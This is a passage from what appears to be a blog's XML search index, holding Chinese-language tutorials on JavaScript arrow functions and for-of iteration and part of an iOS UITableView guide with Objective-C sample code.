解构赋值 扩展运算符 yield* 由于数组遍历调用迭代器接口，所以任何接受数组作为参数的场合，其实都调用了 Iterator 接口： for…of Array.from() Map(), Set(), WeakMap(), WeakSet() Promise.all() Promise.race() …]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[箭头函数]]></title>
    <url>%2F2017%2F12%2F31%2Fjian-tou-han-shu%2F</url>
    <content type="text"><![CDATA[箭头函数 箭头函数表达式的语法比函数表达式更短，并且不绑定自己的this，arguments，super或 new.target。这些函数表达式最适合用于非方法函数，并且它们不能用作构造函数。 语法 123456789101112基础语法(参数1, 参数2, …, 参数N) =&gt; &#123;函数声明&#125;(参数1, 参数2, …, 参数N) =&gt; 表达式（单一）//相当于：(参数1, 参数2, …, 参数N) =&gt;&#123; return表达式&#125;// 当只有一个参数时，圆括号是可选的：(单一参数) =&gt; &#123;函数声明&#125;单一参数 =&gt; &#123;函数声明&#125;// 没有参数的函数应该写成一对圆括号。() =&gt; &#123;函数声明&#125; 高级语法 12345678910//加括号的函数体返回对象字面表达式：参数=&gt; (&#123;foo: bar&#125;)//支持剩余参数和默认参数(参数1, 参数2, ...rest) =&gt; &#123;函数声明&#125;(参数1 = 默认值1,参数2, …, 参数N = 默认值N) =&gt; &#123;函数声明&#125;//同样支持参数列表解构let f = ([a, b] = [1, 2], &#123;x: c&#125; = &#123;x: a + b&#125;) =&gt; a + b + c;f(); // 6 描述 引入箭头函数有两个方面的作用：更简短的函数并且不绑定this。 更短的函数 123456789101112131415var materials = [ 'Hydrogen', 'Helium', 'Lithium', 'Beryllium'];materials.map(function(material) &#123; return material.length; &#125;); // [8, 6, 7, 9]materials.map((material) =&gt; &#123; return material.length;&#125;); // [8, 6, 7, 9]materials.map(material =&gt; material.length); // [8, 6, 7, 9] 不绑定this 在箭头函数出现之前，每个新定义的函数都有它自己的 this值（在构造函数的情况下是一个新对象，在严格模式的函数调用中为 undefined，如果该函数被称为“对象方法”则为基础对象等）。This被证明是令人厌烦的面向对象风格的编程。 123456789101112function Person() &#123; // Person() 构造函数定义 `this`作为它自己的实例. this.age = 0; setInterval(function growUp() &#123; // 在非严格模式, growUp()函数定义 `this`作为全局对象, // 与在 Person()构造函数中定义的 `this`并不相同. this.age++; &#125;, 1000);&#125;var p = new Person(); 在ECMAScript 3/5中，通过将this值分配给封闭的变量，可以解决this问题。 123456789function Person() &#123; var that = this; that.age = 0; setInterval(function growUp() &#123; // 回调引用的是`that`变量, 其值是预期的对象. that.age++; &#125;, 1000);&#125; 或者，可以创建绑定函数，以便将预先分配的this值传递到绑定的目标函数（上述示例中的growUp()函数）。 箭头功能不会创建自己的this；它使用封闭执行上下文的this值。因此，在下面的代码中，传递给setInterval的函数内的this与封闭函数中的this值相同： 123456789function Person()&#123; this.age = 0; setInterval(() =&gt; &#123; this.age++; // |this| 正确地指向person 对象 &#125;, 1000);&#125;var p = new Person(); 与严格模式的关系鉴于 this 是词法层面上的，严格模式中与 this 相关的规则都将被忽略。 12var f = () =&gt; &#123;'use strict'; return this&#125;;f() === window; // 或全局对象 严格模式的其他规则依然不变. 通过 call 或 apply 调用由于 this 已经在词法层面完成了绑定，通过 call() 或 apply() 方法调用一个函数时，只是传入了参数而已，对 this 并没有什么影响： 1234567891011121314151617181920var adder = &#123; base : 1, add : function(a) &#123; var f = v =&gt; v + this.base; return f(a); &#125;, addThruCall: function(a) &#123; var f = v =&gt; v + this.base; var b = &#123; base : 2 &#125;; return f.call(b, a); &#125;&#125;;console.log(adder.add(1)); // 输出 2console.log(adder.addThruCall(1)); // 仍然输出 2（而不是3 ——译者注） 不绑定arguments箭头函数不绑定Arguments 对象。因此，在本示例中，参数只是在封闭范围内引用相同的名称： 123456789101112var arguments = 42;var arr = () =&gt; arguments;arr(); // 42function foo() &#123; var f = (i) =&gt; arguments[0]+i; // 此处的argument为foo的arguments // foo函数的间接参数绑定 return f(2);&#125;foo(1); // 3 在大多数情况下，使用剩余参数是使用arguments对象的好选择。 1234567function foo() &#123; var f = (...args) =&gt; args[0]; return f(2); &#125;foo(1); // 2 像方法一样使用箭头函数如上所述，箭头函数表达式对非方法函数是最合适的。让我们看看当我们试着把它们作为方法时发生了什么。 123456789101112'use strict';var obj = &#123; i: 10, b: () =&gt; console.log(this.i, this), c: function() &#123; console.log( this.i, this) &#125;&#125;obj.b(); // undefinedobj.c(); // 10, Object &#123;...&#125; 箭头函数没有定义this绑定。另一个涉及Object.defineProperty()的示例： 123456789101112'use strict';var obj = &#123; a: 10&#125;;Object.defineProperty(obj, "b", &#123; get: () =&gt; &#123; console.log(this.a, typeof this.a, this); return this.a+10; // 代表全局对象 'Window', 因此 'this.a' 返回 'undefined' &#125;&#125;); 使用 new 操作符箭头函数不能用作构造器，和 new一起用会抛出错误。 12var Foo = () =&gt; &#123;&#125;;var foo = new Foo(); // TypeError: Foo is not a constructor 使用prototype属性箭头函数没有prototype属性。 12var Foo = () =&gt; &#123;&#125;;console.log(Foo.prototype); // undefined 使用 yield 关键字 yield 关键字通常不能在箭头函数中使用（除非是嵌套在允许使用的函数内）。因此，箭头函数不能用作生成器。 函数体箭头功能可以有一个“简写体”或常见的“块体”。 在一个简写体中，只需要一个表达式，并附加一个隐式的返回值。在块体中，必须使用明确的return语句。 12345var func = x =&gt; x * x; // 简写函数 省略returnvar func = (x, y) =&gt; &#123; return x + y; &#125;; //常规编写 明确的返回值 返回对象字面量记住用params =&gt; {object:literal}这种简单的语法返回对象字面量是行不通的。 12345var func = () =&gt; &#123; foo: 1 &#125;; // Calling func() returns undefined!var func = () =&gt; &#123; foo: function() &#123;&#125; &#125;; // SyntaxError: function statement requires a name 这是因为花括号（{} ）里面的代码被解析为一系列语句（即 foo 被认为是一个标签，而非对象字面量的组成部分）。 所以，记得用圆括号把对象字面量包起来： 1var func = () =&gt; (&#123;foo: 1&#125;); 换行箭头函数在参数和箭头之间不能换行。 123var func = () =&gt; 1; // SyntaxError: expected expression, got '=&gt;' 解析顺序虽然箭头函数中的箭头不是运算符，但箭头函数具有与常规函数不同的特殊运算符优先级解析规则。 12345678let callback;callback = callback || function() &#123;&#125;; // okcallback = callback || () =&gt; &#123;&#125;; // SyntaxError: invalid arrow-function argumentscallback = callback || (() =&gt; &#123;&#125;); // ok 更多示例 123456789101112131415161718192021222324252627282930313233343536373839404142// 空的箭头函数返回 undefinedlet empty = () =&gt; &#123;&#125;;(() =&gt; 'foobar')(); // Returns "foobar"// (这是一个立即执行函数表达式,可参阅 'IIFE'术语表) var simple = a =&gt; a &gt; 15 ? 15 : a; simple(16); // 15simple(10); // 10let max = (a, b) =&gt; a &gt; b ? a : b;// Easy array filtering, mapping, ...var arr = [5, 6, 13, 0, 1, 18, 23];var sum = arr.reduce((a, b) =&gt; a + b); // 66var even = arr.filter(v =&gt; v % 2 == 0); // [6, 0, 18]var double = arr.map(v =&gt; v * 2); // [10, 12, 26, 0, 2, 36, 46]// 更简明的promise链promise.then(a =&gt; &#123; // ...&#125;).then(b =&gt; &#123; // ...&#125;);// 无参数箭头函数在视觉上容易分析setTimeout( () =&gt; &#123; console.log('I happen sooner'); setTimeout( () =&gt; &#123; // deeper code console.log('I happen later'); &#125;, 1);&#125;, 1); 箭头函数也可以使用条件（三元）运算符： 12345var simple = a =&gt; a &gt; 15 ? 15 : a;simple(16); // 15simple(10); // 10let max = (a, b) =&gt; a &gt; b ? a : b; 箭头函数内定义的变量及其作用域 12345678910111213141516171819// 常规写法var greeting = () =&gt; &#123;let now = new Date(); return ("Good" + ((now.getHours() &gt; 17) ? " evening." : " day."));&#125;greeting(); //"Good day."console.log(now); // ReferenceError: now is not defined 标准的let作用域// 参数括号内定义的变量是局部变量（默认参数）var greeting = (now=new Date()) =&gt; "Good" + (now.getHours() &gt; 17 ? " evening." : " day.");greeting(); //"Good day."console.log(now); // ReferenceError: now is not defined// 对比：函数体内&#123;&#125;不使用var定义的变量是全局变量var greeting = () =&gt; &#123;now = new Date(); return ("Good" + ((now.getHours() &gt; 17) ? " evening." : " day."));&#125;greeting(); //"Good day."console.log(now); // Fri Dec 22 2017 10:01:00 GMT+0800 (中国标准时间)// 对比：函数体内&#123;&#125; 用var定义的变量是局部变量var greeting = () =&gt; &#123;var now = new Date(); return ("Good" + ((now.getHours() &gt; 17) ? " evening." : " day."));&#125;greeting(); //"Good day."console.log(now); // ReferenceError: now is not defined 箭头函数也可以使用闭包： 123456789101112131415161718192021// 标准的闭包函数function A()&#123; var i=0; return function b()&#123; return (++i); &#125;;&#125;;var v=A();v(); //1v(); //2//箭头函数体的闭包（ i=0 是默认参数）var Add = (i=0) =&gt; &#123;return (() =&gt; (++i) )&#125;;var v = Add();v(); //1v(); //2//因为仅有一个返回，return 及括号（）也可以省略var Add = (i=0)=&gt; ()=&gt; (++i); 箭头函数递归 12var fact = (x) =&gt; ( x==0 ? 1 : x*fact(x-1) );fact(5); // 120 浏览器兼容]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[for-of详解]]></title>
    <url>%2F2017%2F12%2F30%2Ffor...of%2F</url>
    <content type="text"><![CDATA[for-of for…of语句在可迭代对象（包括 Array，Map，Set，String，TypedArray，arguments 对象等等）上创建一个迭代循环，调用自定义迭代钩子，并为每个不同属性的值执行语句。 语法123for (variable of iterable) &#123; //statements&#125; variable在每次迭代中，将不同属性的值分配给变量。 iterable可枚举其枚举属性的对象。 推荐在循环对象属性的时候，使用for…in,在遍历数组的时候的时候使用for…of。 for…in循环出的是key，for…of循环出的是value。for…of修复了for…in的缺陷和不足，假设我们往数组添加一个属性name:aArray.name = ‘demo’,再分别查看上面写的两个循环： 123456for(let index in aArray)&#123; console.log(`$&#123;aArray[index]&#125;`); //aArray.name会也被循环出来了，得到的数组的值的顺序也会被打乱&#125;for(var value of aArray)&#123; console.log(value);&#125; 所以说，作用于数组的for-in循环除了遍历数组元素以外,还会遍历自定义属性。 for…of循环不会循环对象的key，只会循环出数组的value，因此for…of不能循环遍历普通对象,对普通对象的属性遍历推荐使用for…in 如果实在想用for…of来遍历普通对象的属性的话，可以通过和Object.keys()搭配使用，先获取对象的所有key的数组：然后遍历：12345678910111213var student=&#123; name:'wujunchuan', age:22, locate:&#123; country:'china', city:'xiamen', school:'XMUT' &#125;&#125;for(var key of Object.keys(student))&#123; //先获取studentkey的数组，循环数组再得到对象值，基本上是多此一举 //使用Object.keys()方法获取对象key的数组 console.log(key+": "+student[key]);&#125; for…of不能循环普通的对象，需要通过和Object.keys()搭配使用 123456789101112131415161718// for...in循环可以遍历键名，for...of循环会报错。var es6 = &#123; edition: 6, committee: "TC39", standard: "ECMA-262"&#125;;for (e in es6) &#123; console.log(e);&#125;// edition// committee// standardfor (e of es6) &#123; console.log(e);&#125;// TypeError: es6 is not iterable 与forEach()不同的是，它可以正确响应break、continue和return语句,forEach循环会简洁很多，但是不能break、continue、return 1234var a = ["a", "b", "c"];a.forEach(function(element) &#123; console.log(element);&#125;); for…of现在浏览器的支持成都还不是很好 示例 迭代Array 123456789let iterable = [10, 20, 30];for (let value of iterable) &#123; value += 1; console.log(value);&#125;// 11// 21// 31 如果你不想修改语句块中的变量 , 也可以使用const代替let。 12345678let iterable = [10, 20, 30];for (const value of iterable) &#123; console.log(value);&#125;// 10// 20// 30 迭代String 12345678let iterable = "boo";for (let value of iterable) &#123; console.log(value);&#125;// "b"// "o"// "o" 迭代 TypedArray 1234567let iterable = new Uint8Array([0x00, 0xff]);for (let value of iterable) &#123; console.log(value);&#125;// 0// 255 迭代Map 123456789101112131415let iterable = new Map([["a", 1], ["b", 2], ["c", 3]]);for (let entry of iterable) &#123; console.log(entry);&#125;// ["a", 1]// ["b", 2]// ["c", 3]for (let [key, value] of iterable) &#123; console.log(value);&#125;// 1// 2// 3 迭代 Set 12345678let iterable = new Set([1, 1, 2, 2, 3, 3]);for (let value of iterable) &#123; console.log(value);&#125;// 1// 2// 3 迭代 arguments 对象 123456789(function() &#123; for (let argument of arguments) &#123; console.log(argument); &#125;&#125;)(1, 2, 3);// 1// 2// 3 迭代 DOM 集合迭代 DOM 元素集合，比如一个NodeList对象：下面的例子演示给每一个 article 标签内的 p 标签添加一个 “read” 类。 123456//注意：这只能在实现了NodeList.prototype[Symbol.iterator]的平台上运行let articleParagraphs = document.querySelectorAll("article &gt; p");for (let paragraph of articleParagraphs) &#123; paragraph.classList.add("read");&#125; 关闭迭代器对于for…of的循环，可以由break, continue[4], throw 或return[5]终止。在这些情况下，迭代器关闭。 12345678910function* foo()&#123; yield 1; yield 2; yield 3; &#125;; for (let o of foo()) &#123; console.log(o); break; // closes iterator, triggers return&#125; 迭代生成器你还可以迭代一个生成器： 1234567891011121314function* fibonacci() &#123; // 一个生成器函数 let [prev, curr] = [0, 1]; for (;;) &#123; // while (true) &#123; [prev, curr] = [curr, prev + curr]; yield curr; &#125;&#125; for (let n of fibonacci()) &#123; console.log(n); // 当n大于1000时跳出循环 if (n &gt;= 1000) break;&#125; 不要重用生成器生成器不应该重用，即使for…of循环的提前终止，例如通过break关键字。在退出循环后，生成器关闭，并尝试再次迭代，不会产生任何进一步的结果。 1234567891011121314var gen = (function *()&#123; yield 1; yield 2; yield 3;&#125;)();for (let o of gen) &#123; console.log(o); break;//关闭生成器&#125; //生成器不应该重用，以下没有意义！for (let o of gen) &#123; console.log(o);&#125; 迭代其他可迭代对象你还可以迭代显式实现可迭代协议的对象： 123456789101112131415161718192021var iterable = &#123; [Symbol.iterator]() &#123; return &#123; i: 0, next() &#123; if (this.i &lt; 3) &#123; return &#123; value: this.i++, done: false &#125;; &#125; return &#123; value: undefined, done: true &#125;; &#125; &#125;; &#125;&#125;;for (var value of iterable) &#123; console.log(value);&#125;// 0// 1// 2 for…of与for…in的区别无论是for…in还是for…of语句都是迭代一些东西。它们之间的主要区别在于它们的迭代方式。 for…in 语句以原始插入顺序迭代对象的可枚举属性。 for…of 语句遍历可迭代对象定义要迭代的数据。 以下示例显示了与Array一起使用时，for…of循环和for…in循环之间的区别。 123456789101112131415161718192021222324Object.prototype.objCustom = function() &#123;&#125;; Array.prototype.arrCustom = function() &#123;&#125;;let iterable = [3, 5, 7];iterable.foo = 'hello';for (let i in iterable) &#123; console.log(i); // logs 0, 1, 2, "foo", "arrCustom", "objCustom"&#125;for (let i in iterable) &#123; if (iterable.hasOwnProperty(i)) &#123; console.log(i); // logs 0, 1, 2, "foo" &#125;&#125;for (let i of iterable) &#123; console.log(i); // logs 3, 5, 7&#125;Object.prototype.objCustom = function() &#123;&#125;;Array.prototype.arrCustom = function() &#123;&#125;; let iterable = [3, 5, 7]; iterable.foo = 'hello'; 每个对象将继承objCustom属性，并且作为Array的每个对象将继承arrCustom属性，因为将这些属性添加到Object.prototype和Array.prototype。由于继承和原型链，对象iterable继承属性objCustom和arrCustom。 123for (let i in iterable) &#123; console.log(i); // logs 0, 1, 2, "foo", "arrCustom", "objCustom" &#125; 此循环仅以原始插入顺序记录iterable 对象的可枚举属性。它不记录数组元素3, 5, 7 或hello，因为这些不是枚举属性。但是它记录了数组索引以及arrCustom和objCustom。如果你不知道为什么这些属性被迭代，array iteration and for…in中有更多解释。 12345for (let i in iterable) &#123; if (iterable.hasOwnProperty(i)) &#123; console.log(i); // logs 0, 1, 2, "foo" &#125;&#125; 这个循环类似于第一个，但是它使用hasOwnProperty() 来检查，如果找到的枚举属性是对象自己的（不是继承的）。如果是，该属性被记录。记录的属性是0, 1, 2和foo，因为它们是自身的属性（不是继承的）。属性arrCustom和objCustom不会被记录，因为它们是继承的。 123for (let i of iterable) &#123; console.log(i); // logs 3, 5, 7 &#125; 该循环迭代并记录iterable作为可迭代对象定义的迭代值，这些是数组元素 3, 5, 7，而不是任何对象的属性。]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UITableView详解]]></title>
    <url>%2F2017%2F12%2F30%2FUITableView%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[UITableView详解概述UITableView堪称UIKit里面最复杂的一个控件了，同时也是最常用的控件，使用起来不算难，但是要用好并不容易。当使用的时候我们必须要考虑到后台数据的设计，tableViewCell的设计和重用以及tableView的效率等问题。 UITableView只能有一列数据(cell)，且只支持纵向滑动，当创建好的tablView第一次显示的时候，我们需要调用其reloadData方法，强制刷新一次，从而使tableView的数据更新到最新状态。 UITableView使用时常遇到的问题大致如下： 顶层设计 TableView的类型选择 Section的设置，合适分组，如何分组等问题 Cell的使用，是否自定义？是否使用xib？等等 Cell填充问题，一般应遵循重用、解耦原则。 重用问题 UITableViewCell重用 UITableViewHeaderFooterView重用 协议方法 Delegate与DataSource代理方法的含义、实现 UI问题 分割线 Cell自定义 默认选中某个Cell NSIndexPath提到UITableView，就必须的说一说NSIndexPath。UITableView声明了一个NSIndexPath的类别，主要用来标识当前cell的在tableView中的位置，该类别有section和row两个属性，前者标识当前cell处于第几个section中，后者代表在该section中的第几行。 12345678910// 源码来源于UIKit-&gt;UITableView.h// This category provides convenience methods to make it easier to use an NSIndexPath to represent a section and row@interface NSIndexPath (UITableView)+(instancetype)indexPathForRow:(NSInteger)row inSection:(NSInteger)section;@property (nonatomic, readonly) NSInteger section;@property (nonatomic, readonly) NSInteger row;@end UITableViewRowAction12345678910111213141516171819202122232425// 源码来源于UIKit-&gt;UITableView.hNS_CLASS_AVAILABLE_IOS(8_0) __TVOS_PROHIBITED @interface UITableViewRowAction : NSObject &lt;NSCopying&gt;+ (instancetype)rowActionWithStyle:(UITableViewRowActionStyle)style title:(nullable NSString *)title handler:(void (^)(UITableViewRowAction *action, NSIndexPath *indexPath))handler;@property (nonatomic, readonly) UITableViewRowActionStyle style;@property (nonatomic, copy, nullable) NSString *title;@property (nonatomic, copy, nullable) UIColor *backgroundColor; // default background color is dependent on style@property (nonatomic, copy, nullable) UIVisualEffect* backgroundEffect;@end#ifndef SDK_HIDE_TIDENS_CLASS_AVAILABLE_IOS(9_0) @interface UITableViewFocusUpdateContext : UIFocusUpdateContext@property (nonatomic, strong, readonly, nullable) NSIndexPath *previouslyFocusedIndexPath;@property (nonatomic, strong, readonly, nullable) NSIndexPath *nextFocusedIndexPath;@end#endif 一些枚举值UITableViewCellAccessoryType 1234567typedef NS_ENUM(NSInteger, UITableViewCellAccessoryType) &#123; UITableViewCellAccessoryNone, // 不显示任何图标 UITableViewCellAccessoryDisclosureIndicator, // 跳转指示图标 UITableViewCellAccessoryDetailDisclosureButton, // 内容详情图标和跳转指示图标 UITableViewCellAccessoryCheckmark, // 勾选图标 UITableViewCellAccessoryDetailButton NS_ENUM_AVAILABLE_IOS(7_0) // 内容详情图标&#125;; UITableViewCellAccessoryType根据其Index对应的效果图见下图。 用户还可以通过UITableViewCell的accessoryView（UIView）自定义一个UIView视图。UITableViewCellStyle 123456typedef NS_ENUM(NSInteger, UITableViewCellStyle) &#123; UITableViewCellStyleDefault, // 左侧显示textLabel（不显示detailTextLabel），imageView可选（显示在最左边） UITableViewCellStyleValue1, // 左侧显示textLabel、右侧显示detailTextLabel（默认蓝色），imageView可选（显示在最左边） UITableViewCellStyleValue2, // 左侧依次显示textLabel(默认蓝色)和detailTextLabel，imageView可选（显示在最左边） UITableViewCellStyleSubtitle // 左上方显示textLabel，左下方显示detailTextLabel（默认灰色）,imageView可选（显示在最左边）&#125;; UITableViewCellStyle索引对应下图由上往下的次序的效果。 UITableViewCellEditingStyle12345typedef NS_ENUM(NSInteger, UITableViewCellEditingStyle) &#123; UITableViewCellEditingStyleNone, // 无 UITableViewCellEditingStyleDelete, // “-”号效果 UITableViewCellEditingStyleInsert // “+”号效果&#125;; 其它枚举1234567891011121314151617181920212223242526272829303132333435363738// 源码来源于UIKit-&gt;UITableView.htypedef NS_ENUM(NSInteger, UITableViewStyle) &#123; UITableViewStylePlain, // regular table view UITableViewStyleGrouped // preferences style table view&#125;;typedef NS_ENUM(NSInteger, UITableViewScrollPosition) &#123; UITableViewScrollPositionNone, UITableViewScrollPositionTop, UITableViewScrollPositionMiddle, UITableViewScrollPositionBottom&#125;; // scroll so row of interest is completely visible at top/center/bottom of viewtypedef NS_ENUM(NSInteger, UITableViewRowAnimation) &#123; UITableViewRowAnimationFade, UITableViewRowAnimationRight, // slide in from right (or out to right) UITableViewRowAnimationLeft, UITableViewRowAnimationTop, UITableViewRowAnimationBottom, UITableViewRowAnimationNone, // available in iOS 3.0 UITableViewRowAnimationMiddle, // available in iOS 3.2. attempts to keep cell centered in the space it will/did occupy UITableViewRowAnimationAutomatic = 100 // available in iOS 5.0. chooses an appropriate animation style for you&#125;;// Including this constant string in the array of strings returned by sectionIndexTitlesForTableView: will cause a magnifying glass icon to be displayed at that location in the index.// This should generally only be used as the first title in the index.UIKIT_EXTERN NSString *const UITableViewIndexSearch NS_AVAILABLE_IOS(3_0) __TVOS_PROHIBITED;// Returning this value from tableView:heightForHeaderInSection: or tableView:heightForFooterInSection: results in a height that fits the value returned from// tableView:titleForHeaderInSection: or tableView:titleForFooterInSection: if the title is not nil.UIKIT_EXTERN const CGFloat UITableViewAutomaticDimension NS_AVAILABLE_IOS(5_0);typedef NS_ENUM(NSInteger, UITableViewRowActionStyle) &#123; UITableViewRowActionStyleDefault = 0, UITableViewRowActionStyleDestructive = UITableViewRowActionStyleDefault, UITableViewRowActionStyleNormal&#125; NS_ENUM_AVAILABLE_IOS(8_0) __TVOS_PROHIBITED; DateSource——数据源主要为UITableView提供数据供UITableViewCell显示时调用。当指定UITableViewCell支持编辑操作(insert、delete、move、reordering等)时，需在操作时同时操作数据源（DataSource），否则将可能导致crash。 12345678910111213141516Configuring a Table View- tableView:cellForRowAtIndexPath: Required- numberOfSectionsInTableView:- tableView:numberOfRowsInSection: Required- sectionIndexTitlesForTableView:- tableView:sectionForSectionIndexTitle:atIndex:- tableView:titleForHeaderInSection:- tableView:titleForFooterInSection:Inserting or Deleting Table Rows- tableView:commitEditingStyle:forRowAtIndexPath:- tableView:canEditRowAtIndexPath:Reordering Table Rows- tableView:canMoveRowAtIndexPath:- tableView:moveRowAtIndexPath:toIndexPath: Delegate——代理主要提供一些可选的方法，用来控制UITableViewCell的选择、指定section的头和尾的显示以及协助完成cell的删除和排序等功能。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Configuring Rows for the Table View- tableView:heightForRowAtIndexPath:- tableView:estimatedHeightForRowAtIndexPath:- tableView:indentationLevelForRowAtIndexPath:- tableView:willDisplayCell:forRowAtIndexPath:Managing Accessory Views- tableView:editActionsForRowAtIndexPath:- tableView:accessoryTypeForRowWithIndexPath: (iOS 3.0)- tableView:accessoryButtonTappedForRowWithIndexPath:Managing Selections- tableView:willSelectRowAtIndexPath:- tableView:didSelectRowAtIndexPath:- tableView:willDeselectRowAtIndexPath:- tableView:didDeselectRowAtIndexPath:Modifying the Header and Footer of Sections- tableView:viewForHeaderInSection:- tableView:viewForFooterInSection:- tableView:heightForHeaderInSection:- tableView:estimatedHeightForHeaderInSection:- tableView:heightForFooterInSection:- tableView:estimatedHeightForFooterInSection:- tableView:willDisplayHeaderView:forSection:- tableView:willDisplayFooterView:forSection:Editing Table Rows- tableView:willBeginEditingRowAtIndexPath:- tableView:didEndEditingRowAtIndexPath:- tableView:editingStyleForRowAtIndexPath:- tableView:titleForDeleteConfirmationButtonForRowAtIndexPath:- tableView:shouldIndentWhileEditingRowAtIndexPath:Reordering Table Rows- tableView:targetIndexPathForMoveFromRowAtIndexPath:toProposedIndexPath:Tracking the Removal of Views- tableView:didEndDisplayingCell:forRowAtIndexPath:- tableView:didEndDisplayingHeaderView:forSection:- tableView:didEndDisplayingFooterView:forSection:Copying and Pasting Row Content- tableView:shouldShowMenuForRowAtIndexPath:- tableView:canPerformAction:forRowAtIndexPath:withSender:- tableView:performAction:forRowAtIndexPath:withSender:Managing Table View Highlighting- tableView:shouldHighlightRowAtIndexPath:- tableView:didHighlightRowAtIndexPath:- tableView:didUnhighlightRowAtIndexPath:Managing Table View Focus- tableView:canFocusRowAtIndexPath:- tableView:shouldUpdateFocusInContext:- tableView:didUpdateFocusInContext:withAnimationCoordinator:- indexPathForPreferredFocusedViewInTableView:UIKIT_EXTERN NSString *const UITableViewSelectionDidChangeNotification; UITableViewCellUITableViewCell的所有subView都应该加载contentView上面，以免在编辑时出现UI错误。 Edit通过从UITableViewCell中派生一个类，可以更深度的定制一个cell，可以指定cell在进入edit模式的时候如何相应等等。最简单的实现方式就是将所有要绘制的内容放到一个定制的subView中，并且重载该subView的drawRect方法直接把要显示的内容绘制出来(这样可以避免subView过多导致的性能瓶颈)，最后再将该subView添加到cell派生类中的contentView中即可。但是这样定制的cell需要注意在数据改变的时候，通过手动调用该subView的setNeedDisplay方法来刷新界面，这个例子可以在苹果的帮助文档中的TableViewSuite工程中找到，这儿就不举例了。 观看这两种定制cell的方法，我们会发现subView都是添加在cell的contentView上面的，而不是直接加到cell上面，这样写也是有原因的。下面我们看一下cell在正常状态下和编辑状态下的构成图： 用户可自定义Cell的editingAccessoryView属性，以实现编辑状态下的自定义效果。 进入编辑状态下cell的构成图如下： 通过观察上面两幅图片我们可以看出来，当cell在进入编辑状态的时候，contentView会自动的缩放来给Editing control腾出位置。这也就是说如果我们把subView添加到contentView上，如果设置autoresizingMask为更具父view自动缩放的话，cell默认的机制会帮我们处理进入编辑状态的情况。而且在tableView是Grouped样式的时候，会为cell设置一个背景色，如果我们直接添加在cell上面的话，就需要自己考虑到这个背景色的显示问题，如果添加到contentView上，则可以通过view的叠加帮助我们完成该任务。综上，subView最好还是添加到cell的contentView中。 ReOrdering为了使UITableVeiew进入edit模式以后，如果该cell支持reordering的话，reordering控件就会临时的把accessaryView覆盖掉。为了显示reordering控件，我们必须将cell的showsReorderControl属性设置成YES，同时实现dataSource中的tableView:moveRowAtIndexPath:toIndexPath:方法。我们还可以同时通过实现dataSource中的 tableView:canMoveRowAtIndexPath:返回NO，来禁用某一些cell的reordering功能。 下面看苹果官方的一个reordering流程图： 上图中当tableView进入到edit模式的时候，tableView会去对当前可见的cell逐个调用dataSource的tableView:canMoveRowAtIndexPath:方法(此处官方给出的流程图有点儿问题)，决定当前cell是否显示reoedering控件，当开始进入拖动cell进行拖动的时候，每滑动过一个cell的时候，会去掉用delegate的tableView:targetIndexPathForMoveFromRowAtIndexPath:toProposedIndexPath:方法，去判断当前划过的cell位置是否可以被替换，如果不行则给出建议的位置。当用户放手时本次reordering操作结束，调用dataSource中的tableView:moveRowAtIndexPath:toIndexPath:方法更新tableView对应的数据。 此处给个我写demo中的更新数据的小例子： EditTableViewController.h 文件 12345#import &lt;UIKit/UIKit.h&gt;@interface EditTableViewController : UITableViewController@end EditTableViewController.m 文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176#import &quot;EditTableViewController.h&quot;@interface EditTableViewController ()@property (nonatomic, strong) NSMutableArray *dataSource;@end@implementation EditTableViewController- (void)viewDidLoad &#123; [super viewDidLoad]; // Uncomment the following line to preserve selection between presentations. // self.clearsSelectionOnViewWillAppear = NO; // Uncomment the following line to display an Edit button in the navigation bar for this view controller. self.navigationItem.rightBarButtonItem = self.editButtonItem; self.title = @&quot;编辑TableView&quot;; [self prepareItems];&#125;- (void)didReceiveMemoryWarning &#123; [super didReceiveMemoryWarning]; // Dispose of any resources that can be recreated.&#125;#pragma mark - Private Functions- (void)prepareItems&#123; self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@&quot;关闭&quot; style:UIBarButtonItemStylePlain target:self action:@selector(dismissSelf)];&#125;- (void)dismissSelf&#123; [self.navigationController dismissViewControllerAnimated:YES completion:nil];&#125;- (id)deleteObjectWithNSIndexPath:(NSIndexPath *)indexPath&#123; NSMutableArray *array = self.dataSource[indexPath.section]; id obj = [array objectAtIndex:indexPath.row]; [array removeObjectAtIndex:indexPath.row]; return obj;&#125;- (void)insertObject:(NSString *)object inDataSourceAtNSIndexPath:(NSIndexPath *)indexPath&#123; NSMutableArray *array = self.dataSource[indexPath.section]; [array insertObject:object atIndex:indexPath.row];&#125;#pragma mark - Table view data source- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView &#123; return self.dataSource.count;&#125;- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section &#123; return ((NSMutableArray*)self.dataSource[section]).count;&#125;- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath &#123; UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@&quot;zxw&quot;]; if (!cell) &#123; cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:@&quot;zxw&quot;]; &#125; if (indexPath.section &lt; self.dataSource.count) &#123; NSArray *array = self.dataSource[indexPath.section]; if (indexPath.row &lt; array.count) &#123; cell.textLabel.text = self.dataSource[indexPath.section][indexPath.row]; &#125;else&#123; NSLog(@&quot;row越界%ld&quot;,(long)indexPath.row); &#125; &#125;else&#123; NSLog(@&quot;section越界:%ld&quot;,(long)indexPath.section); &#125; return cell;&#125;- (CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section&#123; return 40.0;&#125;- (CGFloat)tableView:(UITableView *)tableView heightForFooterInSection:(NSInteger)section&#123; return 35.0;&#125;- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section&#123; return 